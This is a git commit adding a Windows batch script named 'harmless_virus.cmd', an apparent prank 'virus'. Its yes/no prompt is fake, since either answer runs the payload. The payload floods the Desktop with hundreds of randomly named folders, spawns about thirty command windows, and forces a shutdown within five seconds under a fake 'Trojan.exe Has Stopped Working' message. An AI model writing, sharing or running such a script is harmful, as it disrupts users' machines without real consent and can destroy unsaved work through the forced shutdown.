0689fe061687bf3185f093c5da370ab08c544344
amandaiscodingnow <80795628+amandaiscodingnow@users.noreply.github.com>
2021-03-17 06:29:06 +0700

    Add files via upload

---
+++ harmless_virus.cmd
@@ -0,0 +1,315 @@
+@echo off
+
+:menu
+cls
+echo Are You Sure? (y/n)
+
+set /p hi=
+
+if %hi% === n goto virus
+if %hi% === y goto virus
+
+:virus
+cls
+cd Desktop
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+mkdir %random%
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+shutdown.exe -s -t 05 -c "Trojan.exe Has Stopped Working"
